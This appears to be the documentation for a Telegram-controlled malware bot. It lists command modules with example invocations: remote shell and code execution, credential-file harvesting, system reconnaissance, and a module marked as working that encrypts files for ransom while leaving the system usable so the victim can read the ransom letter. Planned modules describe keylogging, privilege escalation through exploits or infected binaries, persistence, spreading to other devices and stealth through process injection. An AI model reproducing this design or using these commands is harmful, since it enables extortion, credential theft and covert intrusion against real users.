# Modules

This is the documentation of the included by default modules. You can rule your own if you know how to code in any of the supported languages. 
    
  
```bash
Blocks like this represents what you would usually write on Telegram chat
```

### login
Login using the bot password in the password.txt file allowing you to run privileged commands/modules  
  
WORKING  
  
```bash
/login thisismypassword
```

### backup
Backup the selected path allowing you to chose between different levels of compression, password encryption. Gives you a link to the uploaded files  
  
Not Working/In Current Development  

```bash
/backup /home/documents/ 11  
```


### cpp
Run C++ code and return the output to Telegram  
  
Uses system installed g++ command  

WORKING  

```bash
/cpp #include <iostream>

int main() {
  std::cout << "Hello!";
  return 0;
}
```
  
### dumpNetwork
Generates a PCAP network traffic capture and uploads it to Telegram  
  
Not Developed yet  

```bash
/dumpNetwork
```
  
### findCredentials
Find multiple files that are holding sensitive information, creates a JSON and returns it to Telegram  
  
WORKING  

```bash
/findCredentials
```


### getClientInfo
Gathers information about the system. Public IP address, operative system version, kernel version, hardware, number of packages installed, etc. Returns the information to Telegram  
  
WORKING

```bash
/getClientInfo
```

### go
Run GoLang code and returns the output to Telegram  
  
Uses system installed Go command  
  
WORKING

```bash
/go package main
import "fmt"
func main() {
  fmt.Println("Hello!")
}
```

### help
Returns information about available modules to Telegram  
  
WORKING  

```bash
/help
```
  
### js
Run Javascript code and return the output to Telegram  
  
Uses system installed node command. It's not the same process as the Telegram bot  
  
WORKING

```bash
/js console.log(new Date());
```

### keylogger
Captures keyboard keys and returns them to telegram after selected number of keys are captured  
  
Not Developed Yet  

```bash
/keylogger 1000
```
  
### lua
Run Lua code and return the output to Telegram  
  
Uses system installed lua command  
  
WORKING  

```bash
/lua print("Hello")
```
  
### pe
Escalate privileges to root using a known exploit, or if there isn't an available vulnerability for the system, assist you on performing an advanced privilege escalation using social engineering (for example infecting shared binaries and waiting the root users starts a shell to get privileges)  
  
Not Developed Yet  

```bash
/pe
```
  
### persistence  
Get persistence on the system to make sure the bot keeps running even if removed, dependencies are removed or the process is killed  
  
Not Developed Yet  

```bash
/persistence
```

### pivot  
Try to propagate the bot to other systems, media storage, external devices or network devices  
  
Not Developed Yet

```bash
/pivot
```

### python
Run Python code and return the output to Telegram  
  
Uses system installed python command  
  
WORKING

```bash
/python print(f"""Hello!
  How
    Are
      You?
""")
```

### ransomware
Encrypts all the files under indicated path, using a key derivation from your key and indicated compression strength. Some folders are ignored by default, so you don't break the system, the bot continues to work and the user can use the system to read the ransomware letter you send  
  
* Brotli compression is used to improve times, reduce size and increasse security  
* Known cryptography (aes 256 + camellia 256 + aes256, cbc with different IV) is used by default (OpenSSL implentations)  
* Know key derivations (base64, sha512) are used by default  
* Custom Xor encryption is added too (2 layers, using different key derivations) just as an extra. (I think i will help in case know vulnerabilities in OpenSSL arrives some day or to dificult a bit quantum computers job in cracking)  
  
WORKING  
  
```bash
/ransomware e password /home 1
```

```bash
/ransomware d password /home 1
```

### run
Run commands in the system (in a default subshell) and return output to Telegram

WORKING

```bash
/run ls -la
```

### scanNetwork
Scan the local networks to find available services and devices and return result to Telegram  
  
Not Developed Yet  
  
```bash
/scanNetwork
```

### sendMail
Send an email using a free service  
  
Not Developed Yet

```bash
/sendMail from@freeprovider.tld myPassword Hello Hey How are you doing? destination@example.com
```
  
### stealth
Remove any traces of infection, injects itself into another procress memory, goes sleep for the time indicated, run the bot without dependecies, change the footprint  
  
Not Developed Yet  

```bash
/stealth 21h
```
